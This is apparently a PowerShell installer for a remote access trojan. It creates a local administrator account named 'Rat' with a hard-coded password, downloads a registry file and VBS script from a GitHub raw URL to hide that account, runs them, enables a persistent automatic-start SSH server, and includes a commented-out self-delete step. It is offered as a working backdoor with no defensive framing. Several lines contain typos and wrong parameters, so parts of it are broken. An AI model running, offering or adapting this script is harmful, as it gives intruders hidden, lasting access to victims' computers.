#builds resources
#

#random string for directories
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
    }

# create local admin for rat (Create_account = Create-NewLocalAdmin = , uname = NewLocalAdmin, pword = Password)
function Create_account {
    [CmdletBinding()]
    param (
        [string] $uname,
        [securestring] $pword
    )
    begin {
    }
    process {
        New-LocalUser "$uname" -pword $pword -FullName "$uname" -Description "Temporary local admin"
        Write-Verbose "$uname local user created"
        Add-LocalGroupMember -LocalGroupMember "Administrators" -Member "$uname"
    }
    end {     
    }
}

#variable
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location

# create admin user
$uname = Rat
$pword = (ConvertTo-SecureString "rat123" -AsPlainText -Force)
Create_account -uname $uname -pword $pword

# go to temp, make working directory
mkdir $path
cd $path

# registry to hide local admin
Invoke-WebRequest -Uri raw.githubusercontent.com/Promite/TEST/main/test-reg.reg -Outfile "reg.reg"

# visual basic script to regiser the registry
Invoke-WebRequest -Uri raw.githubusercontent.com/Promite/TEST/main/test-script.vbs -Outfile "script.vbs"

# install the registry
./reg.reg; ./script.vbs

# enabling persistent SSH
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Serivce -Name sshd -StartupType 'Automatic'
#removed for some reason?
#Get-NetFirewallRule -Name *ssh*

# delete self
cd $initial_dir
# del installer.ps1
